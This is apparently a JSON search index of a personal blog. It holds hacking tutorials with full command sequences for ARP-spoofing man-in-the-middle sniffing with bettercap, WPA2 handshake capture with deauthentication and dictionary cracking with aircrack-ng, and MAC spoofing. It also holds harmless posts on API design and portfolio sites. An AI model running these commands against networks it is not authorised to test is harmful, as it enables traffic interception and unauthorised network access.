command\nbettercap-shell\u0026gt; net.show The output should look something like this:\nNote down the IP of the target device on which we want to perform ARP spoofing. For my case, it is the device with the name infinee.local and target IP is 192.168.29.65.\n4. ARP spoofing attack on the target IP Now we will run the ARP spoofing attack on the target device. This will place us in between the user and the router. So we can intercept the data and see all the URLs and the websites the target device is visiting, and anything the user posts. We will use the arp.spoof module provided by berttercap.\nIf you wish you can run help arp.spoof to see the list of options provided by this module. We will need to set the arp.spoof.fullduplex option to true. Doing this will spoof both the target device and the router and we will be in the middle of the connection. We will do this by running the following command.\nbettercap-shell\u0026gt; set arp.spoof.fullduplex true Next, we should set the target using the below command. target_ip for me here is 192.168.29.65 . And turn it on by typing arp.spoof on\nbettercap-shell\u0026gt; set arp.spoof.targets \u0026lt;target_ip\u0026gt; bettercap-shell\u0026gt; arp.spoof on arp.spoof on will do 3 things:\n Tell the router that I am the user at target_ip Tell the machine at target_ip that I am the router Enable port forwarding so that my machine can seamlessly transfer data between these two  Kudos!!! We are now Man-in-The-Middle. We can now capture packets using a program of our own or use Wireshark. For this blog, we will use a tool provided by bettercap. Once you are man-in-the-middle, there will be a small lag on the page load time on the target machine.\nPacket Sniffing We have to tell bettercap to capture all the data that flows through this computer and analyze it for me. To do this we will use the net.sniff module provided by bettercap . Simply run the following command to start sniffing.\nbettercap-shell\u0026gt; net.sniff on As you can see, we are able to see the API requests and the request bodies transferred between the client machine and the internet.\nWe had to write so many bettercap commands for ARP-spoofing. We can write all these commands in a *.cap file where * is any file name and execute them through bettercap. For this, I will create a file called arp-spoof.cap with the following contents\nnet.probe on set arp.spoof.fullduplex true set arp.spoof.targets \u0026lt;target_ip\u0026gt; arp.spoof on net.sniff on We call this a caplet. To execute it, run the following command in the terminal:\n$ bettercap -iface \u0026lt;interface_name\u0026gt; -caplet arp-spoof.cap Sniff packets using WireShark Alternatively, we can use a sniffing tool called Wireshark to sniff these packets. We will still need to do arp spoofing using bettercap. Wireshark is just a replacement of the net.sniff module of bettercap.\nRun the following commands to install wireshark :\n$ sudo add-apt-repository ppa:wireshark-dev/stable $ sudo apt-get update $ sudo apt-get install wireshark To start wireshark :\n$ sudo wireshark From the UI of wireshark, we select the network interface that we got in step 1. And our sniffer will start as shown in the pictures below.\nThe network packets viewed by both the methods — bettercap and Wireshark are the same, just that wireshark is the UI way of net.sniff inbettercap with slightly more information.\nThis method won’t work for packets sent over the HTTPS protocol. We will only be able to read packets that are sent over the HTTP protocol.\nHowever, there are caplets available on the internet that can be executed via bettercap that will help you to partially bypass the HTTPS and the HSTS protocols. You can find one such caplet here: ByPass HTTPS\n","permalink":"https://gourav-dhar.com/blogs/man-in-the-middle-attacks-by-arp-spoofing-tutorials-and-examples/","tags":["Hacking","Programming","Spoofing"],"title":"Man in the Middle Attacks by ARP Spoofing | Gourav Dhar"},{"categories":["Ethical Hacking"],"contents":" Almost all modern-day wifi routers use WPA2 encryption. The WEP connections or WPS-enabled networks were easier to hack into because of the flaws in their design. WPA/WPA2 encryption took care of all these flaws, still, there are ways to get into a network secured by WPA2. The only known practical way to crack a WPA2 encrypted network is through a wordlist/dictionary attack.\n Changing MAC Address Before starting you may want to change your MAC Address. This is an optional step. If you want to change your MAC address, you can follow the steps mentioned in this link https://gourav-dhar.com/blogs/how-to-change-mac-address/.\nCracking WPA2 Cracking WPA2 using brute force involves mainly 2 parts:\n Capturing Handshake Running Brute Force on the captured Handshake  Capturing Network Handshake To send a packet in a network, the packet should have a source MAC address and a destination MAC address. A device will only receive data that has destination MAC as its address. We will exploit this rule to perform de-auth attacks later. The data packets are literally sent over the air, so if we are in the range of the router, we will be able to capture these packets, so change the wireless interface to monitor mode. By default, it should be in managed mode. To enter monitor mode, run these commands:\n Note: To check the name of your wireless network interface run iwconfig. For my case it is wlan1. (Most modern day network adapters support monitor mode. If your adapter does not support monitor mode you can purchase an external adapter that supports this mode)\n $ ifconfig wlan1 down $ airmon-ng check kill $ airmon-ng start wlan1 The first command ifconfig wlan1 down will turn down the wireless adapter. airmon-ng check kill will kill any process interfering. You will lose your internet connection but it’s okay. It’s not required for further steps. airmon-ng start wlan1 will set the wlan1 interface to monitor mode. You can use iwconfig to verify that your adapter is in monitor mode. Note this adapter name. For my case it is wlan1mon .\nWe will use airodump-ng for packet sniffing.\n$ airodump-ng wlan1mon We will see output something like this.\nThe ESSID is the name of the network. BSSID is the MAC address of the target network. PWR is the power of the network. Beacons are the frames broadcasted by the network to show its presence. #Data are the number of useful packets sent. CH is the channel number the network works on. MB is the speed supported by the network.\nNext, I will run airodump-ng over the network highlighted. Let’s assume this is my target network.\nairodump-ng --bssid 60:32:B1:XX:XX:XX --channel 1 --write wpa_handshake wlan1mon This will store the sniffed data in a file named wpa_handshake. We specified the bssid of the network on which we want to perform the attack and the channel number specified by the channel argument. The output will look like this:\nYou will see a wpa_handshake-01.cap file is generated which will contain all data transferred to and from the network. The MAC addresses specified in the station are the MAC addresses of the devices connected to the WiFi network.\nNow we need to literally wait for some client to connect and airodump-ng will give us the captured handshake.\nWe can also perform a de-authentication attack which will force the client to disconnect from the wifi network and when we stop the attack, the client will try to connect to the network and we can capture the handshake packet.\nTo perform a de-auth attack on the client, open another terminal and type the following command, where -a specifies the bssid of the network and -c is the MAC address of the device that we want to deauthenticate.\n$ aireplay-ng --deauth 4 -a 60:32:B1:XX:XX:XX -c 3C:06:30:XX:XX:XX After this, the client will get disconnected and get authenticated again and we will see the following indication in the airodump-ng terminal. There will be a text WPA handshake beside the Elapsed time.\nNow that we have captured the handshake, you can stop it by pressing Ctrl+C.\nTo get the wifi interface back to managed mode type the below command\n$ airmon-ng stop wlan1mon First of all — Congrats on capturing the handshake. Take a moment to celebrate. We are halfway there.\nBrute Force Attack on the captured handshake The captured handshake will allow us to verify if a password is valid or not. So we will use a brute force attack to try and check random strings against the captured packet.\nWe will need a wordlist for it. You can google and download a potential list of wpa2 passwords or use the crunch command to generate a wordlist of your own.\nI will create a wordlist using crunch command.\n$ crunch 6 8 qwertyuiopasdfghjklzxcvbnm -o wordlist The syntax for this is $ crunch [min] [max] [chars] -o [outputfile name] -t [possible pattern] .\nThis will generate a file named wordlist with all the possible combinations of the above characters. You can also specify a pattern for the wordlists, for eg. if you know the password starts with a , your command would look like crunch 7 7 qwertyuiopasdfghjklzxcvbnm -o wordlist -t a@@@@@@\nFinally, we test the words in the wordlist against the captured handshake using the below command.\n$ aircrack-ng wpa_handshake-01.cap -w wordlist If we are lucky and the password lies in the list, we see an output something like this. The password is in the parenthesis beside the KEY FOUND text.\nCongrats on getting the password! The only known practical way to crack a WPA2 encrypted network is through a wordlist/dictionary attack. However, there are social engineering ways to get the password, which I will describe in my upcoming blogs.\n","permalink":"https://gourav-dhar.com/blogs/hack-wifi-passwords-crack-wpa2-wifi-passwords-using-brute-force-attacks/","tags":["Hacking","Programming","Spoofing"],"title":"Hack WiFi Passwords | Gourav Dhar"},{"categories":["Ethical Hacking"],"contents":"MAC Address stands for Media Access Control. It is a unique address specific to a device set by the device manufacturer. No two devices in the world have the same MAC Address. Even if you connect the device to another computer, the MAC address won’t change. It is used to identify devices within the network and transfer packets based on the MAC address.\nReasons you should change MAC Address Changing MAC address will make you anonymous on the network, allow you to impersonate other devices, and will allow you to bypass certain restrictions.\nChanging the MAC Address  Let’s check the network devices attached to my network. Run the following command :  $ ifconfig The output should look like this: We can see 2 network devices lo and wlan0 We are interested to change the MAC address of our wi-fi adapter which is wlan0 . In wlan0 we see ether 00:11:22:33:44:55 This is our MAC address.\nBefore changing we need to:\n bring the wifi interface down. change the MAC address bring the wifi interface up  Run the following set of commands:\n$ ifconfig wlan0 down $ ifconfig wlan0 hw ether 22:33:44:55:00:11 $ ifconfig wlan0 up Now if I run ifconfig we can see that my MAC address has been changed to the MAC address we specified.\n Note: The MAC address will revert back to the original MAC address set by the manufacturer when we restart because we are only changing the MAC address in network memory and not the physical MAC address.\n ","permalink":"https://gourav-dhar.com/blogs/how-to-change-mac-address/","tags":["Hacking","Programming","Spoofing"],"title":"How to change MAC Address? | Gourav Dhar"},{"categories":["Cool Tech Stuff"],"contents":"A working website You will need to have a project for your website. It can be a simple static website using html/css or a reactive website using react/angular etc. If you are not a web developer and don’t understand whatever is written above or you don’t want to go through the lengthy process of designing and developing your website, it’s fine. You can download a template of the website from the link below and edit it with your details. The template website : https://startbootstrap.com/theme/creative This website has a lot of free and paid designs which you can browse through and download. https://startbootstrap.com/themes/portfolio-resume Download the website, unzip it. Make your changes in the index.html file. Open the index.html file and it should open the website in your browser.\n","permalink":"https://gourav-dhar.com/blogs/create-a-stunning-portfolio-website-with-your-own-website-name-from-scratch-within-1-hour/","tags":["Programming","Portfolio"],"title":"Create and deploy a stunning portfolio website with your own website name from scratch within 1 hour"},{"categories":["System Design"],"contents":" Have you created a service and want others to use it? Well!!! Apis are the way to do it.\n What is an API? Suppose you have written a program that performs a task (maybe takes an input and returns an output based on it). You would want a way for other people to use your program — You need APIs for this purpose.\nAPI stands for Application Programming Interface, which is a software interface between external users or other services and your program. We can expose API endpoints on the internet through which other applications can interact with our program.\nDesigning good APIs  There’s no one right set of characteristics. Whatever design serves the purpose in an efficient manner is a “good API design”.\n As a software developer, I would want the APIs to have the following set of characteristics which would ensure consistency, security, and efficiency in my system.\nSRP (Single Responsibility Principle) Ensure each API has a single responsibility. This makes the operation performed atomic and our database is consistent with what the clients expect. This way the client knows that if the API fails or returns an exception, then no part of the operation was performed. It reduces ambiguity.\nLet’s take an example — Suppose we want to create a user and assign a label to it. If we use a single API to execute the operations and the API fails and returns an exception, there would be confusion whether the user was created and an exception occurred while creating the label, or exception was returned while creating the user and no user was created. So it is better to create 2 separate APIs, one for creating users and the other to update parameters/assign labels to users.\nNaming the API Name the APIs so that it becomes easy for the clients to guess the purpose of the API. The type of request (GET, PUT, POST, DELETE) adds context to the naming as well. This way if your server has a bunch of APIs exposed, it becomes easy for the client to manage the APIs while using them. Also, it makes debugging easier.\nFor example, if you want to get details of a user, you could name the API as\nGET - /api/user/{userId} Similarly to delete the user you could name it as\nDELETE — /api/user/{userId} Abstraction Return only what is needed.\n Sometimes you may be convinced to return extra information through your API maybe by apprehending certain requirements for the future. Trust me it’s not a good idea! (A lot of times it will happen that those requirements don’t come up or you will end up creating a separate API for it for some reason). You don’t want to expose certain information which can be exploited by hackers to get into your system. Be careful! Also exposing only what is needed is a neat way to present, creates less confusion, and also reduces coupling in some cases. Returning less data — reduces response time and saves internet bandwidth. (And makes surfing easy for everyone!)  Logging Logging API name, request parameters, response time is a good practice that helps to debug issues and maintain your program.\nIt is also important that you accidentally don’t log user sensitive information, like email, passwords, credit card details, etc. which may be received as part of the API request, and can be a probable security vulnerability.\nValidate User Roles / Permissions Add user role validations to APIs. It is obvious right!, you don’t want the regular users to have access to APIs meant for Admin.\nThrow Custom Exceptions In case your API fails — due to some internal function failure or a database network call, maybe due to invalid input or whatever, it is a good practice to throw a custom exception message along with the exception. (Maybe create a custom Exception class).\nThis helps a lot while reading logs and debugging issues. The client also gets an idea of what is going wrong. The way to do this would be to identify probable scenarios where the API is likely to throw an exception, for example when a client is trying to access information he/she is not entitled to or maybe if the client requests to modify user details which don’t exist.\nResponse Time The less response time the better! — Obvious right.\n Make sure to place the endpoint on the correct micro-service which would optimize the number of external calls made to other microservices. Also while making database calls, try to reduce the number of calls (by maybe fetching all the data together or other ways). Another way would be to receive extra parameters as part of the request body which would prevent the need to make extra database calls to fetch that information. Try to use Threads and Futures wherever possible. Multi-threading generally makes execution faster right! You may also want to use caches at the API level. The data returned by APIs which is called frequently and which is generally not updated so frequently can be stored in the local cache of the server.  Handling Scale Suppose all of a sudden you see a large influx of clients using your API. (After all, things tend to increase exponentially!). Your database and server have a certain limit on the number of connections. Your system was not designed to handle such a scale! Obviously, you would have to scale up your system, but in the meantime, as a hotfix, you could temporarily remove certain unimportant database calls or functions so that your API can still perform. This is a good thing to keep in mind while designing APIs.\nPagination Pagination is a must. Suppose you are exposing an API that returns registered user details. Your system could have like 1,00,000 registered users. One way to go around this would be to fetch all the users from the database, process all their information, and send the result back over the internet. Well, there are lots of problems with this approach\n Sending so much data over the network would consume a lot of bandwidth. Querying the database with so much data, sending, and processing it would increase the response time. (You don’t want your client to wait minutes for the response) There are high chances the client would not even use all the info which he requested, which is a waste of resources.  There’s no way the client would show or use all the 1,00,000 user information at once. Using filters in the request body and pagination is the solution for it.\n Using pagination, the API would query certain fragments of data (maybe 100 records) from the database and return those 100 records along with a token which the client can again use to fetch the next fragment (maybe the next 100 records). This way the response time is less, we are using only the information which is useful and it reduces complexity and load on resources.  Rate Limiting Set rate limits — You may want to limit the number of API calls made by a user (or a token) within a given time frame. If a user exceeds that limit you throttle their request for that time period. There can be several reasons why you want to add rate limits —\n prevents resource starvation this is a way to keep a check that you are not denying service to other clients because one client is using your API a lot. prevents malicious attacks like DDOS(Distributed Denial of Service) by hackers  You could rate limit programmatically or you could also charge clients some amount of money whenever they make an API call.\n  While I think the above rules contribute to good API designs, you may be in situations where you would need to compromise on certain design rules to make some other aspect of system more efficient. As a software developer it’s your responsibility to weigh the pros and cons and make a call. After all, designing systems are all about trade-offs (time vs space).\n ","permalink":"https://gourav-dhar.com/blogs/apis-and-how-to-design-them-all-you-need-to-know-/","tags":["API","System Design","Backend","Programming"],"title":"APIs and How to design them ! | Gourav Dhar"},{"categories":["Cool Tech Stuff"],"contents":"In computer science, a thread of execution is the smallest sequence of programmed instructions that can be managed independently by a scheduler, which is typically a part of the operating system.”\n","permalink":"https://gourav-dhar.com/blogs/c++-threads-for-beginners/","tags":["Programming","C++","Threads"],"title":"C++ Threads for beginners"},{"categories":null,"contents":"Replace all \u0026ldquo;http://gourav-dhar.com/\u0026quot; to \u0026ldquo;https://gourav-dhar.com/\u0026quot; in the docs folder after Building\n","permalink":"https://gourav-dhar.com/readme/","tags":null,"title":""}]